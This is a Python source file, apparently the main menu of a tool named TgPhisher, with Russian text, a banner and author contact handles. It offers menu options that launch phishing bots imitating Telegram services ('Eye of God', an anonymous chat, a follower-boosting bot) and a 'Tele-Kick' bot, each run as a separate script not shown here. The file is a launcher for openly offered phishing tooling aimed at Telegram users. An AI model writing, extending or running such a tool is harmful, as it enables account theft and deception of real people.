import subprocess
import sys
import colorama
from colorama import init, Fore, Style
init()

red = Fore.RED
cyan = Fore.CYAN
blue = Fore.BLUE
green = Fore.GREEN

yellow = Fore.YELLOW
reset = Style.RESET_ALL
bold = Style.BRIGHT



def create_Telekick():
    script_path = os.path.join('data', 'da.py')
    try:
        # Попытка запуска через "python"
        subprocess.run(["python", script_path])
    except Exception:
        try:
            # Попытка запуска через "python3"
            subprocess.run(["python3", script_path])
        except Exception:
            print("     Обе попытки запустить скрипт не удалось.")

def create_sv():
    script_path = os.path.join('data', 'sv.py')
    try:
        # Попытка запуска через "python"
        subprocess.run(["python", script_path])
    except Exception:
        try:
            # Попытка запуска через "python3"
            subprocess.run(["python3", script_path])
        except Exception:
            print("     Обе попытки запустить скрипт не удалось.")

def create_eyeofgod():
    script_path = os.path.join('data', 'eog.py')
    try:
        # Попытка запуска через "python"
        subprocess.run(["python", script_path])
    except Exception:
        try:
            # Попытка запуска через "python3"
            subprocess.run(["python3", script_path])
        except Exception:
            print("     Обе попытки запустить скрипт не удалось.")

def create_anonchat():
    script_path = os.path.join('data', 'ac.py')
    try:
        # Попытка запуска через "python"
        subprocess.run(["python", script_path])
    except Exception:
        try:
            # Попытка запуска через "python3"
            subprocess.run(["python3", script_path])
        except Exception:
            print("     Обе попытки запустить скрипт не удалось.")

import os

def display_banner():
    os.system('cls' if os.name == 'nt' else 'clear')  # Очистка экрана

    menu = f"""{blue}
{bold}{blue}
                ______      ____  __    _      __             
               /_  __/___ _/ __ \/ /_  (_)____/ /_  ___  _____
                / / / __ `/ /_/ / __ \/ / ___/ __ \/ _ \/ ___/
               / / / /_/ / ____/ / / / (__  ) / / /  __/ /    
              /_/  \__, /_/   /_/ /_/_/____/_/ /_/\___/_/     
                  /____/                                   
{reset}  
                   {yellow}Telegram:{reset} t.me/CYB3R_ST4LK3R              
                 {yellow}GitHub:{reset} github.com/TheCyberStalker/TgPhisher
                 {blue}  ╔════════════════════════════════════╗
                  {blue} ║ {yellow}1{reset} - {cyan}Запуск фишинг Глаз Бога {blue}       ║
                 {blue}  ║ {yellow}2{reset} - {cyan}Запуск фишинг Анонимного чата{blue}  ║
                 {blue}  ║ {yellow}3{reset} - {cyan}Запуск фишинг Накрутчик бота {blue}  ║
                 {blue}  ║ {yellow}4{reset} - {cyan}Запуск Tele-Kick бота {blue}         ║
                  {blue} ║ {yellow}0{reset} - {cyan}Выход                  {blue}        ║
                 {blue}  ╚════════════════════════════════════╝
    """
    print(menu)

def main():
    while True:
        display_banner()

        choice = input(f"\n              {yellow}TgPhisher{reset}#{yellow}Run >>{reset} ")

        if choice == "1":
            create_eyeofgod()
        elif choice == "2":
            create_anonchat()
        elif choice == "3":
            create_sv()
        elif choice == "4":
            create_Telekick()
        elif choice == "0":
            print("Выход из программы...")
            break
        
        else:
            print("Неверный выбор!")
if __name__ == "__main__":
    main()
